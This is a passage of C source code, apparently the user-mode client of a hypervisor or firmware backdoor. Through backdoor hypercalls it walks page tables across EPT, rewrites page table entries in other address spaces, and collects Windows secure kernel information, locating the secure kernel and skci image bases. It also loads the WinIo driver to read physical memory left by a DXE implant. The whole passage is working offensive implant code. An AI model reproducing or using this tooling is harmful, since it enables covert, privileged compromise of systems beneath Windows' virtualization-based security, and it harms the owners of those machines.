                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    PT_entry.Uint64
                );
            }

            if (PT_entry.Bits.Present)
            {
                *ret = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) +
                       PAGE_OFFSET_4K(addr);

                if (ept_addr != 0)
                {
                    if (backdoor_phys_translate(*ret, ret, ept_addr) != 0)
                    {
                        return -1;
                    }
                }

                return 0;
            }
            else
            {
                dbg_printf("ERROR: PTE for 0x%llx is not present\n", addr);
            }
        }
        else
        {
            *ret = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) +
                   PAGE_OFFSET_2M(addr);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(*ret, ret, ept_addr) != 0)
                {
                    return -1;
                }
            }

            return 0;
        }                  
    }
    else
    {
        *ret = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) +
               PAGE_OFFSET_1G(addr);

        if (ept_addr != 0)
        {
            if (backdoor_phys_translate(*ret, ret, ept_addr) != 0)
            {
                return -1;
            }
        }

        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t pml4_addr, uint64_t ept_addr)
{
    uint64_t phys_addr = 0;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        dbg_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }

    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (PML4_entry.Bits.Present == 0)
    {
        dbg_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        dbg_printf(
            "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (PDPT_entry.Bits.Present == 0)
    {
        dbg_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);

        if (ept_addr != 0)
        {
            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
            {
                return -1;
            }
        }

        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            dbg_printf(
                "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (PD_entry.Bits.Present == 0)
        {
            dbg_printf("ERROR: PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
                {
                    return -1;
                }
            }

            if (backdoor_phys_read_64(phys_addr, old) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                dbg_printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    *old, entry
                );
            }

            if (backdoor_phys_write_64(phys_addr, entry) != 0)
            {
                return -1;
            }

            return 0;
        }
        else
        {
            dbg_printf("ERROR: 2M page\n");
        }                  
    }
    else
    {
        dbg_printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_sk_info(SK_INFO *sk_info, uint64_t *call_count)
{
    uint64_t arg0 = 0;
    uint64_t arg1 = 0;
    uint64_t arg2 = 0;    

    dbg_printf("[+] Collecting secure kernel information...\n");

    // start collecting secure kernel information
    uint64_t ret = backdoor_call(HVBD_C_SK_GET_START, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    for (int i = SK_INFO_TIMEOUT; i > 0; i -= 1)
    {
        dbg_printf("\r> %d   ", i);

        Sleep(1000);
    }

    dbg_printf("\r");

    // stop collecting secure kernel information
    ret = backdoor_call(HVBD_C_SK_GET_STOP, &arg0, &arg1, &arg2);
    if (ret != HVBD_E_SUCCESS)
    {
        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
        return -1;
    }    

    dbg_printf("[+] Reading collected data from 0x%llx...\n", arg0);

    if (backdoor_virt_read(arg0, sk_info, sizeof(SK_INFO) * SK_MAX_COUNT) != 0)
    {
        return -1;
    }    

    if (call_count)
    {
        *call_count = arg2;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
{
    int ret = -1;
    uint64_t idt_addr_phys = 0;
    uint64_t idt_addr_virt = sk_info->IdtAddr;
    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;

    if (sk_info->Rip == SK_NONE)
    {
        // secure kernel info is not available
        return -1;
    }

    m_quiet = true;

    // get secure kernel IDT physical address
    if (backdoor_virt_translate(idt_addr_virt, &idt_addr_phys, pml4_addr, ept_addr) != 0)
    {
        dbg_printf(__FUNCTION__"() ERROR: unable to get IDT physical address\n");
        goto _end;
    }

    IDT_ENTRY idt_entry;    

    // read IDT vector #0 entry
    if (backdoor_phys_read(idt_addr_phys, &idt_entry, sizeof(idt_entry)) != 0)
    {
        goto _end;
    }

    // calculate vector address
    uint64_t vect_addr_phys = 0, ptr = 0;
    uint64_t vect_addr_virt = ((uint64_t)idt_entry.offset32 << 32) |
                              ((uint64_t)idt_entry.high_offset << 16) | idt_entry.low_offset;

    dbg_printf("[+] Secure kernel IDT vector #0 is at 0x%llx\n", vect_addr_virt);

    vect_addr_virt &= ~(PAGE_SIZE - 1);

    uint64_t addr_virt = 0, addr_phys = 0;

    while (ptr < SK_MAX_IMAGE_SIZE)
    {
        uint16_t signature = 0;

        // get IDT vector physical address
        if (backdoor_virt_translate(vect_addr_virt, &vect_addr_phys, pml4_addr, ept_addr) != 0)
        {
            dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image physical address\n");
            goto _end;
        }

        if (backdoor_phys_read(vect_addr_phys, &signature, sizeof(signature)) != 0)
        {
            goto _end;
        }

        // check image header signature
        if (signature == IMAGE_DOS_SIGNATURE)
        {
            addr_virt = vect_addr_virt;
            addr_phys = vect_addr_phys;

            if (sk_addr)
            {
                *sk_addr = vect_addr_virt;
            }

            break;
        }

        ptr += PAGE_SIZE;
        vect_addr_virt -= PAGE_SIZE;
    } 

    if (addr_virt == 0)
    {
        dbg_printf(__FUNCTION__"() ERROR: unable to find secure kernel image base\n");
        goto _end;
    }

    uint64_t iat_entry_virt = 0, iat_entry_phys = 0;

    uint8_t *buff = (uint8_t *)M_ALLOC(PAGE_SIZE);
    if (buff)
    {
        // read secure kernel image headers
        if (backdoor_phys_read(addr_phys, buff, PAGE_SIZE) == 0)
        {
            IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)buff;
            if (dos_hdr->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
            {
                IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS *)RVATOVA(buff, dos_hdr->e_lfanew);

                uint32_t imp_rva = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
                if (imp_rva != 0)
                {
                    IMAGE_IMPORT_DESCRIPTOR imp;
                    uint64_t imp_addr_phys = 0, imp_addr_virt = addr_virt + imp_rva;                    

                    memset(&imp, 0, sizeof(imp));

                    // get import directory physical address
                    if (backdoor_virt_translate(imp_addr_virt, &imp_addr_phys, pml4_addr, ept_addr) == 0)
                    {
                        // read import descriptor
                        backdoor_phys_read(imp_addr_phys, &imp, sizeof(imp));
                    }
                    else
                    {
                        dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image imports physical address\n");
                    }

                    if (imp.FirstThunk != 0)
                    {
                        uint64_t iat_addr_phys = 0, iat_addr_virt = addr_virt + imp.FirstThunk;

                        // get IAT entry physical address
                        if (backdoor_virt_translate(iat_addr_virt, &iat_addr_phys, pml4_addr, ept_addr) == 0)
                        {
                            // read IAT entry that usually points to skci imported function
                            backdoor_phys_read(iat_addr_phys, &iat_entry_virt, sizeof(iat_entry_virt));
                        }
                        else
                        {
                            dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image IAT physical address\n");
                        }
                    }
                }
                else
                {
                    dbg_printf(__FUNCTION__"() ERROR: secure kernel image imports not found\n");
                }                
            }            
            else
            {
                dbg_printf(__FUNCTION__"() ERROR: bad secure kernel image header\n");
            }
        }        

        M_FREE(buff);
    }

    if (iat_entry_virt == 0)
    {
        dbg_printf(__FUNCTION__"() ERROR: unable to find skci image pointer\n");
        goto _end;
    }

    ptr = 0;
    iat_entry_virt &= ~(PAGE_SIZE - 1);

    while (ptr < SK_MAX_IMAGE_SIZE)
    {
        uint16_t signature = 0;

        // get IDT vector physical address
        if (backdoor_virt_translate(iat_entry_virt, &iat_entry_phys, pml4_addr, ept_addr) != 0)
        {
            dbg_printf(__FUNCTION__"() ERROR: unable to get skci image physical address\n");
            goto _end;
        }

        if (backdoor_phys_read(iat_entry_phys, &signature, sizeof(signature)) != 0)
        {
            goto _end;
        }

        // check image header signature
        if (signature == IMAGE_DOS_SIGNATURE)
        {
            if (skci_addr)
            {
                *skci_addr = iat_entry_virt;
            }

            ret = 0;
            goto _end;
        }

        ptr += PAGE_SIZE;
        iat_entry_virt -= PAGE_SIZE;
    }

    dbg_printf(__FUNCTION__"() ERROR: unable to find skci image base\n");

_end:

    m_quiet = false;

    return ret;
}
//--------------------------------------------------------------------------------------
int backdoor_read_debug_messages(void)
{    
    int ret = -1;    
    wchar_t *var_name = BACKDOOR_VAR_NAME, var_guid[MAX_PATH];
    GUID guid = BACKDOOR_VAR_GUID;
    uint64_t address = 0;

    wsprintfW(
        var_guid, L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]
    );

    // obtain needed privileges
    if (load_privileges(SE_SYSTEM_ENVIRONMENT_NAME) != 0)
    {
        dbg_printf("ERROR: Unable to obtain %s privilege\n", SE_SYSTEM_ENVIRONMENT_NAME);
        return -1;
    }

    dbg_printf("[+] Reading firmware variable %ws %ws\n", var_name, var_guid);

    // get debug messages buffer address
    if (GetFirmwareEnvironmentVariableW(var_name, var_guid, (void *)&address, sizeof(address)) != sizeof(address))
    {
        dbg_printf("GetFirmwareEnvironmentVariable() ERROR %d\n", GetLastError());
        dbg_printf("ERROR: Unable to get debug messages buffer address\n");
        return -1;
    }    

    char driver_path[MAX_PATH];
    char *driver_name = WINIO_DRIVER_NAME, *device_path = WINIO_DEVICE_PATH;

    GetSystemDirectory(driver_path, MAX_PATH);
    strcat_s(driver_path, "\\drivers\\");
    strcat_s(driver_path, driver_name);

    // copy driver into the system folder
    if (!CopyFile(driver_name, driver_path, FALSE))
    {
        dbg_printf("CopyFile() ERROR %d\n", GetLastError());
        dbg_printf("ERROR: Unable to copy \"%s\" into the \"%s\"\n", driver_name, driver_path);
        return -1;
    }

    bool already_started = FALSE, stop = FALSE;

    dbg_printf("[+] Loading WinIo driver...\n");

    HANDLE fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (fd == INVALID_HANDLE_VALUE)
    {
        // create and start service
        if (service_start(WINIO_SERVICE_NAME, driver_path, &already_started))
        {
            stop = !already_started;

            dbg_printf("[+] WinIo driver was loaded\n");

            // open driver device
            fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (fd == INVALID_HANDLE_VALUE)
            {
                dbg_printf("CreateFile() ERROR %d\n", GetLastError());
                dbg_printf("ERROR: Unable to open \"%s\"\n", device_path);
                goto _end;
            }
        }
        else
        {
            dbg_printf("ERROR: Unable to load WinIo driver\n");
            goto _end;
        }
    }    
    else
    {
        dbg_printf("[+] WinIo driver is already loaded\n");
    }

    if (fd != INVALID_HANDLE_VALUE)
    {   
        char *buff = (char *)M_ALLOC(DEBUG_OUTPUT_SIZE);
        if (buff)
        {
            memset(buff, 0, DEBUG_OUTPUT_SIZE);

            dbg_printf("[+] Reading DXE driver debug messages from 0x%llx\n", address);

            // read debug messages buffer 
            if (winio_phys_mem_read(fd, address, DEBUG_OUTPUT_SIZE, buff) == 0)
            {
                // print debug messages to the screen
                dbg_printf("\n%s\n", buff);

                ret = 0;
            }
            else
            {
                dbg_printf("ERROR: Unable to read debug messages buffer\n");
            }

            M_FREE(buff);
        }

        CloseHandle(fd);
    }

_end:

    if (stop)
    {
        // stop and delete service
        service_stop(WINIO_SERVICE_NAME);
        service_remove(WINIO_SERVICE_NAME);
    }

    DeleteFile(driver_path);

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
